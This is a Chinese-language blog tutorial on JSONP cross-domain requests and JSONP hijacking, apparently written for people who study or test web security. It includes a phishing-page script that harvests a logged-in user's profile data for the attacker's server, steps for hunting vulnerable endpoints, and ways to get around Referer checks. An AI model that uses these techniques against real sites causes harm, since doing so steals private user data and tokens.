---
title: "JSONP劫持"
onlyTitle: true
date: 2022-08-18 13:05:36
categories:
- 溯源
- JSONP
tags:
- 溯源
- JSONP
- 蜜罐
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B81.png

---

# JSONP概念

JSONP=JSON with padding

JSONP实现跨域请求，就是动态创建`<script>`标签

先看一个动态创建`<script>`的简述：



```javascript
var script = document.createElement("script");
script.src = "https://api.douban.com/v2/book/search?q=javascript&count=1&callback=handleResponse";
document.body.insertBefore(script,document.body.firstChild);
```

先创建script标签，然后定义src，添加至标签属性。src指向的就是回调位置



## 跨域测试

先在本地用phpstudy测试一下，1.html的内容：

```html
<!DOCTYPE html>
<html>
<head>
    <title>GoJSONP</title>
</head>
<body>
<script type="text/javascript">
    function jsonhandle(data){
        alert("age:" + data.age + "name:" + data.name);
    }
</script>
<script type="text/javascript" src="jquery-3.3.1.min.js"></script>
<script type="text/javascript">
    $(document).ready(function(){
        $.ajax({
            type : "get",
            url : "http://localhost/godown.php?id=1",
            dataType: "jsonp",//指定我们的请求是一个 jsonp 的请求
            success : function(data) {//success 指定的是默认的回调函数
                jsonhandle(data);
            }
        });
    });
</script>
</body>
</html>
```

```php
<?php
header('Content-Type:application/json; charset=utf-8');
$data = array('age'=>19,'name'=>'jianshu');
exit(json_encode($data));
?>
```

如果不受同源策略约束，访问1.html时会弹窗。

但是结果返回了无Access-Control-Allow-Origin值，阻止了跨域访问。因为来自script标签内的get请求 和 godown.php 不同源

虽然浏览器受到了同源策略约束，但是在开发过程跨域请求几乎是必须用到。

但是仍有办法，在html中，`<img>`的src、`<link>`的href和`<script>`的src，都可以无视同源策略，原因也很简单，这几个标签的src一般都要指向外链

所以在\<script\>的src直接指向js文件即可访问：

```javascript
</script>
<script type="text/javascript" src="http://localhost/remote.js"></script>
```

remote.js:

```javascript
jsonhandle({
    "age" : 15,
    "name": "John",
})
```

远程js不需要script标签。还能直接使用1.html定义的函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212195553076.png)



## jsonp测试

1.html:

```html
<!DOCTYPE html>
<html>
<head>
    <title>GoJSONP</title>
</head>
<body>
<script type="text/javascript">
    function jsonhandle(data){
        alert("age:" + data.age + "name:" + data.name);
    }
</script>
<script type="text/javascript" src="jquery-3.3.1.min.js">
</script>
<script type="text/javascript">
    $(document).ready(function(){
        var url = "http://localhost/godown.php?id=1&callback=jsonhandle";
        var obj = $('<script><\/script>');
        obj.attr("src",url);
        $("body").append(obj);
    });
</script>
</body>
</html>
```

同样的定义一个jsonhandle函数，同样的把url放进script标签的src属性，然后放进html的body部分。不同的是godown.php接收callback参数，等于调用jsonhandle函数

godown.php:

```php
<?php
$data = array(
    'age' => 20,
    'name' => 'dada',
);

$callback = $_GET['callback'];

echo $callback."(".json_encode($data).")";
return;
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212200329246.png)

jsonp和远程调用remote.js有什么区别？其实就是加了个callback回调参数



利用jquery库可以更方便的跨域：

```html
<!DOCTYPE html>
<html>
<head>
    <title>GoJSONP</title>
</head>
<body>
<script type="text/javascript" src="jquery-3.3.1.min.js"></script>
<script type="text/javascript">
function jsonhandle(data){
    alert("age:" + data.age + "name:" + data.name);
}
</script>
<script type="text/javascript">
    $(document).ready(function(){
        $.ajax({
            type : "get",
            url : "http://localhost/godown.php?id=1",
            dataType: "jsonp",
            jsonp:"callback", //指定回调函数在 URL 中的参数名(不指定默认为 callback)
            jsonpCallback: "jsonhandle",//指定回调函数名称(如果不指定，服务器会随机分配一个jQueryxxx 的名字)
            success : function(data) {
                console.info("调用success");
            }

        });
    });
</script>
</body>
</html>
```

此时发出的get请求等于：

```html
http://localhost/godown.php?id=1&callback=jsonhandle
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212203153709.png)



# JSONP攻击

## jsonp跨域劫持

jsonp劫持就是攻击者获取了本该传给本网站其他接口的数据。就比如上面的例子，向有漏洞的godown.php发送jsonp请求，php不经过检测就执行了错误的函数。但是godown.php通常是用来返回数据，利用JSONP能非法获取用户数据

## jsonp跨域劫持示例

1）用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息；
2）用户通过浏览器向网站A发出URL请求；
3）网站A向用户返回响应页面，响应页面中注册了JavaScript的回调函数和向网站B请求的script标签，示例代码如下：

```javascript
<script type="text/javascript">
function Callback(result)
{
    alert(result.name);
}
</script>
<script type="text/javascript" src="http://B.com/user?jsonp=Callback"></script>
```

4）用户收到响应，解析JS代码，将回调函数作为参数向网站B发出请求；
5）网站B接收到请求后，解析请求的URL，以JSON 格式生成请求需要的数据，将封装的包含用户信息的JSON数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下：

```javascript
Callback({"id":1,"name":"test","email":"test@test.com"})。
```

6）网站B数据返回后，浏览器则自动执行Callback函数对步骤4返回的JSON格式数据进行处理，通过alert弹窗展示了用户在网站B的注册信息。另外也可将JSON数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。



可以看到jsonp劫持很像csrf，通过网站A窃取用户在网站B的信息。



## JSONP劫持漏洞挖掘：

登录网站（不登录无法知道是否有敏感数据泄露），在chrome浏览器F12，把保留日志勾上。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212211101925.png)

以freebuf为例（当然freebuf没有），在过滤窗口搜索callback、json、email等关键字，也可以手动找符合形式的请求

找到可疑的请求就拖到url访问一下看有没有关注的敏感信息。

如果存在，切换页面看是否能被不同的域请求到。

当然以上过程可以换位selenium+proxy代理实现，验证的话就剔除Referer字段再进行请求，不需要referer就能拿到敏感json，那就存在jsonp劫持漏洞



## json水坑攻击

所谓水坑攻击，也就是钓鱼and信息收集窃取数据，发现jsonp接口后制作一个钓鱼网站，其中包含自动请求jsonp接口的脚本，比如：

```java
$.ajax({
    url: 'jsonp漏洞接口',
    type: 'get',
    dataType: 'jsonp',
}).done(function(json){
    var id = json["data"]["id"];
    var screen_name = json["data"]["screen_name"];
    var profile_image_url = json["data"]["profile_image_url"];

    var post_data = "";
    post_data += "id=" + id + "&amp;";
    post_data += "screen_name=" + screen_name + "&amp;";
    post_data += "profile_image_url=" + encodeURIComponent(profile_image_url);
    console.log(post_data);
    // 发送到我的服务器上
}).fail(function() {});
```

将目标的id,screen_name和profile_image_url发送到本地服务器。

## JSONP跨域劫持token

发起jsonp请求，获取token后进行csrf攻击

## Referer绕过

1. 利用data URL构造无Referer请求。

2. HTTPS发送HTTP请求。目标网站可以通过HTTP访问时，HTTPS页面发起HTTP请求默认不发送Referer



参考：https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/

https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/
